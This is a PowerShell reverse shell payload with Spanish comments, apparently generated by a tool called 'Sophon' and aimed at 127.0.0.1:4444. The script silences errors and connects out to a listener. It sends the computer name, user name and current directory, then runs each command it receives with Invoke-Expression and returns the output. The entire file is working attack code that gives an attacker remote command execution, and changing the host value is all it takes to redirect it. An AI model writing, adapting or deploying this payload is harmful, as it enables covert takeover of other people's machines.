# Sophon Reverse Shell Payload (PowerShell)
# Target: 127.0.0.1:4444
# Generado por Sophon - Herramienta de reconocimiento de red

$ErrorActionPreference = "SilentlyContinue"

try {
    $client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 4444)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | % {0}

    # Enviar info del sistema al conectar
    $sysinfo = "PS $($env:COMPUTERNAME)\$($env:USERNAME) @ $(Get-Location)`n"
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sysinfo)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $result = (Invoke-Expression $data 2>&1 | Out-String)
        $prompt = $result + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([Text.Encoding]::ASCII).GetBytes($prompt)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
} catch {
    # Conexion fallida o cerrada
} finally {
    if ($client) { $client.Close() }
}
